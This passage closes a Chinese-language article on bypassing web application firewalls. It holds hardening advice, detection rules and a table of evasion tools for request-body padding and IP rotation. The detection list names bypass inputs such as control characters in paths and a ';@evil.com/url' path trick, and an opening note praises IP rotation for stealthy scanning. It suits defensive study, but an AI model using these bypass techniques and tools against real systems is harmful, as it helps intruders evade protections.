> **注意**：轮换 IP 用于规避限速/封禁，与请求体大小绕过、静态资源缺口组合可提升扫描隐蔽性；API Gateway 自身也可能受 CloudFront 等前置防护约束。

---

# 0x08 防御与检测

## 8.1 加固建议

1. **Nginx ACL 避免精确匹配**：`location = /path` 存在系统性绕过风险，使用 `location ~* ^/admin { deny all; }` 正则前缀匹配，并确保代理层与后端使用一致的路径规范化逻辑。
2. **升级与补丁**：ModSecurity v3 升级至 ≥ 3.0.12（CVE-2024-1019）；v2 无补丁，避免在规则中单独依赖 `REQUEST_FILENAME`/`REQUEST_BASENAME`/`PATH_INFO`。
3. **请求体检查阈值**：明确 WAF 的请求体检查上限，对超限请求选择"阻断"而非"放行"（Azure 预防模式）；对必须放行业务，在后端框架层补偿检查。
4. **消除解析差异而非逐条修补**：Vercel 最终方案证明，逐项修补 multipart 语法差异无法收敛——在**原始字节流**上做归一化（移除 NUL、双重反转义、模式封堵）才能消除 WAF 与后端的解析差集。
5. **归一化顺序**：Unicode 归一化（NFKC/NFKD）与 URL 解码必须先于安全检测执行；限制解码深度（如仅 1 次），与应用实际行为对齐。
6. **静态资源一致策略**：对 `.js`/`.css` 等静态路径的 GET 请求应用与动态请求一致的头部内容检查，谨慎对待基于静态扩展名的缓存自动透传。
7. **内联检查深度**：事件处理器检查需解析全部语句而非仅首条；将 `;` 后的语句纳入检测。

## 8.2 检测方法

- 监控含非常规控制字符（`\x85`、`\xA0`、`\x1F`–`\x0B`、`\x09`、`\x0C`）的请求路径，与 matrix 参数 `;` 出现在路径段开头（如 `;1337/api/...`、`;@evil.com/url`）的请求。
- 告警头部值中的 tab/空格续行（Line Folding）模式。
- 监控超过 WAF 检查阈值且 `Content-Length` 异常的 POST/PUT/PATCH。
- multipart 请求中：重复 `boundary=`、多个 `Content-Type`、部件级非 utf8 charset、结束标记尾空格、`\n` 单独作分隔符——任一出现即标记。
- 对编码深度异常（同一参数被多次 URL 编码、Unicode 兼容字符混入 ASCII 上下文）的输入做回溯审计。

---

# 0x09 工具

| 工具 | 用途 |
|------|------|
| [nowafpls](https://github.com/assetnote/nowafpls) | Burp 插件，向请求注入垃圾数据撑大请求体以越过 WAF 检查阈值 |
| [FireProx](https://github.com/ustayready/fireprox) | AWS API Gateway 临时代理，IP 轮换（ffuf 友好） |
| [IP-Rotate](https://github.com/PortSwigger/ip-rotate) | Burp 官方插件，API Gateway IP 轮换 |
| [ShadowClone](https://github.com/fyoorer/ShadowClone) | 容器实例并行执行，大规模探测 |
| [CATSpin](https://github.com/rootcathacking/catspin) | 轻量 API Gateway 代理轮换 |

---

## 参考资料

- [Exploiting HTTP Parsers Inconsistencies — rafa](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)（Nginx ACL 绕过字符矩阵、AWS WAF Line Folding 原始研究；现迁移至 blog.bugport.net）
- [ModSecurity: Path Confusion and really easy bypass on v2 and v3 — SicuraNext](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)（CVE-2024-1019）
- [$170k in Bypasses: The Vercel React2Shell Challenge — Hacktron](https://www.hacktron.ai/blog/react2shell-vercel-waf-bypass)（CVE-2025-55182，multipart 五连绕过）
- [Exploring Javascript events & Bypassing WAFs via character normalization — 0x999](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization)
- [Turning a harmless XSS behind a WAF into a realistic phishing vector — hackcommander](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [WAF Bypassing with Unicode Compatibility — jlajara](https://jlajara.gitlab.io/Bypass_WAF_Unicode)
- [How I found a 0-Click Account takeover in a public BBP — hesar101](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [AWS WAF quotas — AWS 官方文档](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)
- [Azure Application Gateway WAF 请求大小限制 — Microsoft Learn](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)
- [Akamai 社区：WAF 请求体检查限制](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)（默认 8 KB，Advanced Metadata 可扩至 128 KB）
- [Cloudflare Ruleset Engine — HTTP request body fields](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)
- [busboy lib/utils.js — charset 映射源码](https://github.com/mscdex/busboy/blob/6b3dcf69d38c1a8d53a0b3e4c88ba296f6c91525/lib/utils.js#L403-L406)
- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [PayloadsAllTheThings — XSS Filter Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads)
- [5 Ways I Bypassed Your WAF — allypetitt (Medium)](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2)
- [Unicode 兼容字符查询表 — compart.com](https://www.compart.com/en/unicode)
- [WAF 绕过技术全景（视频）](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
